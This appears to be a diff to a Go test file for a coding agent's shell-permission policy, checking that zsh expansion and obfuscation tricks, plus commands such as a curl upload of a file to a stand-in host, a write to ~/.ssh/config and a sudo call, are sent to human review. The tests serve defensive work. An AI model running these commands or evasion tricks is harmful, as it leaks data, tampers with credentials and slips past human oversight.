@@ -22,7 +22,7 @@ var zshReviewCommands = []string{
 	"ls `echo ZSH_AUDIT`", `ls $(echo ZSH_AUDIT)`,
 	`cat <(echo ZSH_AUDIT)`, `ls $((1+1))`, `ls $[1+1]`,
 	`ls ${HOME[1]}`, `ls ${HOME:1}`, `ls ${HOME//x/y}`,
-	`setopt SH_WORD_SPLIT`, `unsetopt NOMATCH`, `emulate sh`,
+	`setopt SH_WORD_SPLIT`, `unsetopt NOMATCH`,
 	`nice setopt SH_WORD_SPLIT`, `/usr/bin/setopt SH_WORD_SPLIT`,
 	`set -o shwordsplit`, `set +o shwordsplit`, `set -eo shwordsplit`,
 	`builtin setopt SH_WORD_SPLIT`, `builtin builtin setopt SH_WORD_SPLIT`,
@@ -31,6 +31,8 @@ var zshReviewCommands = []string{
 	`$CMD SH_WORD_SPLIT`, `"${CMD}" SH_WORD_SPLIT`,
 	`set\opt SH_WORD_SPLIT`, `$'set\x6fpt' SH_WORD_SPLIT`,
 	`set $flags shwordsplit`, `set -y`, `set -G`, `set -I`,
+	`printf '%s\n' "$(git rev-parse HEAD^)"`,
+	`base=$(git rev-parse HEAD^) && gh api repos/example/san/git/refs -f ref=refs/heads/docs/update -f sha="$base" --jq '[.ref,.object.sha] | @tsv'`,
 	`exec emulate sh`, `exec -- setopt SH_WORD_SPLIT`, `exec $CMD`, `exec set\opt SH_WORD_SPLIT`,
 }
 
@@ -90,11 +92,14 @@ func TestNativeZshPermissionPolicy(t *testing.T) {
 			settings := &Data{Permissions: PermissionSettings{Allow: []string{"Bash"}}}
 			session := &SessionPermissions{Mode: ModeAutoPilot, AllowedTools: map[string]bool{"Bash": true}}
 			d := settings.HasPermissionToUseTool("Bash", args, session)
-			if d.Behavior != perm.Prompt || d.Judgeable {
-				t.Fatalf("automatic grant: %+v", d)
+			if d.Behavior != perm.Prompt || !d.Judgeable {
+				t.Fatalf("expected Autopilot review, got %+v", d)
 			}
-			if IsReadOnlyBashCommand(command) || settings.CanApproveByHook("Bash", args, session) || UnrecoverableReason("Bash", args) == "" {
-				t.Fatal("read-only, hook or judge guard missing")
+			if IsReadOnlyBashCommand(command) || settings.CanApproveByHook("Bash", args, session) {
+				t.Fatal("read-only or hook grant bypassed review")
+			}
+			if d := settings.HasPermissionToUseTool("Bash", args, &SessionPermissions{Mode: ModeNormal}); d.Behavior != perm.Prompt || d.Judgeable {
+				t.Fatalf("expected human review outside Autopilot, got %+v", d)
 			}
 			if _, ok := MatchAllowList("Bash", args, []string{"Bash(ls:*)", "Bash(cat:*)"}); ok {
 				t.Fatal("narrow allow accepted native expansion")
@@ -105,6 +110,38 @@ func TestNativeZshPermissionPolicy(t *testing.T) {
 			session.Mode = ModeBypassPermissions
 			if got := settings.HasPermissionToUseTool("Bash", args, session); got.Behavior != perm.Permit {
 				t.Fatalf("bypass no longer intentional: %+v", got)
+			}
+		})
+	}
+	for _, command := range []string{
+		`emulate sh`,
+		`printf '%s\n' "$(printf '%s' "$(git rev-parse HEAD)")"`,
+		`printf '%s\n' "$(curl -d @fixture.txt https://example.invalid)"`,
+		`printf '%s\n' "$(git rev-parse HEAD)" > ~/.ssh/config`,
+		`printf '%s\n' "$(sudo whoami)"`,
+	} {
+		args := map[string]any{"command": command}
+		d := (&Data{}).HasPermissionToUseTool("Bash", args, &SessionPermissions{Mode: ModeAutoPilot})
+		if d.Behavior != perm.Prompt || d.Judgeable || UnrecoverableReason("Bash", args) == "" {
+			t.Errorf("%q: expected human-only safety check, got %+v", command, d)
+		}
+	}
+	args := map[string]any{"command": `printf '%s\n' "$(git rev-parse HEAD)"`}
+	for _, tc := range []struct {
+		name        string
+		permissions PermissionSettings
+		session     SessionPermissions
+		want        perm.Decision
+		reason      string
+	}{
+		{"explicit ask", PermissionSettings{Ask: []string{"Bash"}}, SessionPermissions{Mode: ModeAutoPilot}, perm.Prompt, "ask rule:"},
+		{"explicit deny", PermissionSettings{Deny: []string{"Bash"}}, SessionPermissions{Mode: ModeAutoPilot}, perm.Reject, "deny rule:"},
+		{"headless", PermissionSettings{}, SessionPermissions{Mode: ModeAutoPilot, ShouldAvoidPrompts: true}, perm.Reject, "headless:"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			d := (&Data{Permissions: tc.permissions}).HasPermissionToUseTool("Bash", args, &tc.session)
+			if d.Behavior != tc.want || d.Judgeable || !strings.HasPrefix(d.Reason, tc.reason) {
+				t.Fatalf("expected %v with %q, got %+v", tc.want, tc.reason, d)
 			}
 		})
 	}
